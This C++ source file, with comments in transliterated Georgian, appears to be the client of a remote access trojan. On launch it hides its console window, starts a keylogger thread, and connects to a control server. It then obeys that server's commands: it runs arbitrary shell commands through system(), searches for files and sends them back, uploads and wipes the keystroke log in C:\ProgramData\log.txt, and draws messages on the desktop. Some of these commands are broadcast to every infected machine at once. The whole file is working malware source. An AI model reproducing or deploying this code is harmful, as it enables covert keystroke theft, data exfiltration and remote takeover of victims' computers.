
		#include"head.h"
		#include"sokets.cpp"
		#include "filesearch.cpp";

HFONT create_font(HWND hwnd)
{
HFONT hfont;
hfont=CreateFont(22,0,0,0,FW_BOLD,0,0,0,0,0,0,2,0,"SYSTEM_FIXED_FONT");
//SendMessage(hwnd,WM_SETFONT,(UINT)hfont,0);
return hfont;
}
void  main()
{ 
	FreeConsole();
	/////////////// keylogeris gashveba ////////////////////

	
		CreateThread(0,0,keyloger,0,0,0);
	///////////////////////////////////////////////////////
	HFONT hfont=create_font(GetDesktopWindow());
	SOCKET sock;
	soketss(&sock); //// soketis sheqmna
	
	
	
///////////////////// programis identificireba tu meramdene programaa qselshi gashvebuli "numeracia"//
	char IDI[10];
	 recv(sock,IDI,10,0);
	 int IDC1=atoi(IDI);
	// MessageBox(0,IDI,IDI,0);
/////////////////////////////////////////////////////////////////////////////////////////////////////
static bool firststart=1;
HDC hdc=GetDC(GetDesktopWindow());
char buf[4096];
char buf1[30]; ///shetyobinebis gagzavnistvis  imis shesaxeb rom ID debi daemtxva ertmanets an rom globalurad agzavni yvelas kompiuterze
string userInput;
int sendResult;
do
{
	memset(buf,0,sizeof(buf));
	int bytesReceived=recv(sock,buf,4095,0);
	userInput="\r\n";
	int IDC=atoi(buf);
	if(bytesReceived<=0){
				/////////////////////////////// tu kavshiri gawyda vidaxebt xelmeored soket funqcias kavshiris agdgenisatvis ///////
				soketss(&sock);
		//	MessageBox(0,",tytrytyt",0,0);
			}


		/////////////////////////// individualuri brdzanebebi //////////////////////////////////////
	if(userInput.size() > 0&&IDC==IDC1) /// IDdebis shedareba 
	{		memset(buf1,0,sizeof(buf1));
			strcat(buf1,"PROGRAMA::");
			strcat(buf1,IDI);
			strcat(buf1,"::ELODEBA BRDZANEBAS\r\n");
		 sendResult = send(sock,buf1,strlen(buf1)+1,0); //// shetyobinebis gagzavna imis shesaxeb rom konkretuli programa 
		firststart=0;
		 if(sendResult != SOCKET_ERROR)					//// romlis aidic miutitet mzad aris da elodeba brdzanebas 
		{
			 ZeroMemory(buf,4096);
			 bytesReceived = recv(sock,buf,4096,0);
			if(bytesReceived<=0){
				/////////////////////////////// tu kavshiri gawyda vidaxebt xelmeored soket funqcias kavshiris agdgenisatvis ///////
				soketss(&sock);
		//	MessageBox(0,",tytrytyt",0,0);
			}
			if(bytesReceived>0)
			{

		//		cout<< "SERVER> " <<string(buf,0,bytesReceived)<<endl;
				
					if(buf[0]=='*')
					{
						static int Cbuf;
						char clearr[1000];
					for(int i=0;i<=500;i++)
					{
						clearr[i]=' ';
					}
						TextOut(hdc,50,200,clearr,1000);
						  PAINTSTRUCT ps;
						HDC hdc1 = BeginPaint(GetDesktopWindow(), &ps);

						FillRect(hdc1, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW+1));

				//    EndPaint(GetDesktopWindow(), &ps);

				

							SetTextColor(hdc,RGB(239, 2, 2));

							HFONT	hTmp=(HFONT)SelectObject(hdc,hfont);
							//	SetBkMode(hdc,1);
					
							TextOut(hdc,50,200,buf,strlen(buf));
							SendMessage(GetDesktopWindow(),WM_SIZE,0,1);


							userInput="TEXTIS GAMOTANA \n";
							sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							Cbuf=strlen(buf);
							
							/*
							DeleteObject(SelectObject(hdc,hTmp));
							EndPaint(GetDesktopWindow(), &ps);

								SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
								*/
						
					}
					else if(buf[0]=='#')
					{

						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
						TextOut(hdc,50,200,"                                                                                                  ",strlen("                                                                                                  "));
						userInput="TEXTI WAISHALA\n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
							firststart=1;
						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
					}



				int returns=0;
				 if(buf[0]=='~')
				{
					buf[0]=' ';
			
					returns=system(buf);


							if(returns ==-1)
							{
								userInput="-1 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}

					
							if(returns ==0)
							{
								userInput="0 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}
							if(returns ==1)
							{
								userInput="0 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}
								firststart=1;
				}	

				else if(buf[0]=='$')
				{
						firststart=1;
				userInput="kavshiris shemowmeba \n";
				sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
				}
				 ///// es aris failebis dzebna //////////////
				else if(buf[0]==(char)92) //(char)92
				{
					
					firststart=1;
					int fff=strlen(buf);
					buf[fff-3]='\0';
					int fff2=strlen(buf);
					for(int i=0;i<fff;i++)
					{
						buf[i]=buf[i+1];

					}				
					char*dataa=(char*)find_file_in_dir(buf);
					
					if(dataa){
					sendResult = send(sock,(const char*)dataa,strlen(dataa)+1,0);
					}

					else
					{
							
						userInput="araswori sintaxi";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);

					}
				}
			////////// keilogeris mier shevsebuli buferis gagzavna
				else if(buf[0]=='%'&&buf[1]!='d')
				{
						firststart=1;
				char* text=read("C:\\ProgramData\\log.txt");
				send(sock,text,strlen(text),0);

				}
				/////////////// keylogeris buferis gasuftafeba
				else if(buf[0]=='%'&&buf[1]=='d')
				{
					firststart=1;
				char* text=read("C:\\ProgramData\\log.txt");
				char * pasuxi=clear("C:\\ProgramData\\log.txt");
				send(sock,pasuxi,strlen(pasuxi),0);

				}


			}

		}
	
	}
	
	/////////////////////////// END individualuri brdzanebebi //////////////////////////////////////

	////////////////////////// globaluri brdzanebebi yvela kompiuteristvis /////////////////////////
	else if(buf[0]=='A'&&buf[1]=='L'&&buf[2]=='L'){
		//////////////////// yvela kompiuteris gatishvis brdzaneba /////////////////////
		bytesReceived = recv(sock,buf,4096,0);
			 if(buf[0]=='~')
				{
					buf[0]=' ';
			
					int returns=system(buf);


							if(returns ==-1)
							{
								userInput="-1 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}

					
							if(returns ==0)
							{
								userInput="0 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}
							if(returns ==1)
							{
								userInput="0 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}

				}

	/////////////// yvela kompiuteris ekranze teqstis gamotanis brdzaneba ////////////////////////
			 				
			 else	if(buf[0]=='*')
					{
						static int Cbuf;
						char clearr[1000];
						for(int i=0;i<=1000;i++){
								clearr[i]=' ';
								}
						TextOut(hdc,50,200,clearr,1000);
						PAINTSTRUCT ps;
						HDC hdc1 = BeginPaint(GetDesktopWindow(), &ps);
						FillRect(hdc1, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW+1));
				//      EndPaint(GetDesktopWindow(), &ps);
						SetTextColor(hdc,RGB(239, 2, 2));
						HFONT	hTmp=(HFONT)SelectObject(hdc,hfont);
					//	SetBkMode(hdc,1);
						TextOut(hdc,50,200,buf,strlen(buf));
						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
						userInput="TEXTIS GAMOTANA YVELAS KOMPIUTERZE\n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
						Cbuf=strlen(buf);
							
							/*
							DeleteObject(SelectObject(hdc,hTmp));
							EndPaint(GetDesktopWindow(), &ps);

								SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
								*/
						
					}
			 	else if(buf[0]=='#')
					{
						char clear[1200];
						for(int i=0;i<=1200;i++)
						{
							clear[i]=' ';
						}
						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
						TextOut(hdc,50,200,clear,strlen(clear));
					
						userInput="TEXTI WAISHALA YVELAS KOMPIUTERZE \n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
					}


	}

}while(userInput.size()>0);
 /// aq itisheba kavshiri da wyvets mushaobas orive programa
closesocket(sock);

WSACleanup();
}